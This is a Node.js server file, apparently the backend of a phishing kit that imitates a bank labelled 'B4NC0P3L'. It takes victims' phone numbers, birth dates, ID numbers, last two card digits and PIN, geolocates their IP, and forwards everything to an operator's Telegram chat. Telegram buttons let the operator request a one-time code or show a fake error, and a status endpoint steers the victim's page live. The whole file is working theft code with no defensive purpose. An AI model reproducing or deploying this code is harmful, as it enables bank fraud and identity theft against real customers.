const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}
function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

// Función para obtener IP real
function obtenerIpReal(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
    .split(',')[0].trim();
}

// Función para obtener ciudad desde ipinfo.io
async function obtenerCiudad(ip) {
  try {
    const res = await fetch(`https://ipinfo.io/${ip}/json`);
    const data = await res.json();
    return data.city || "Desconocida";
  } catch (err) {
    console.error("Error al obtener ciudad:", err.message);
    return "Desconocida";
  }
}

app.post('/enviar', async (req, res) => {
  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, txid } = req.body;

  const ip = obtenerIpReal(req);
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🔵B4NC0P3L🔵
🆔 ID: <code>${txid}</code>

📱 Celular: ${celular}
🎂 Nacimiento: ${fechaNacimiento}
🆔 Tipo ID: ${tipoIdentificacion}
🔢 Identificador: ${numeroIdentificador}
💳 Últimos 2: ${ultimos2}
🔐 NIP: ${nip}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }], 
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  clientes[txid] = "esperando";
  guardarEstado();

  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar2', async (req, res) => {
  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, txid } = req.body;

  const ip = obtenerIpReal(req);
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🔵B4NC0P3L🔵
🆔 ID: <code>${txid}</code>

📱 Celular: ${celular}
🎂 Nacimiento: ${fechaNacimiento}
🆔 Tipo ID: ${tipoIdentificacion}
🔢 Identificador: ${numeroIdentificador}
💳 Últimos 2: ${ultimos2}
🔐 NIP: ${nip}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }], 
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  clientes[txid] = "esperando";
  guardarEstado();

  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/callback', async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback || !callback.data) return res.sendStatus(400);

  const [accion, txid] = callback.data.split(":");
  clientes[txid] = accion;
  guardarEstado();

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has seleccionado: ${accion}`
    })
  });

  res.sendStatus(200);
});

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  res.json({ status: clientes[txid] || "esperando" });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));
app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
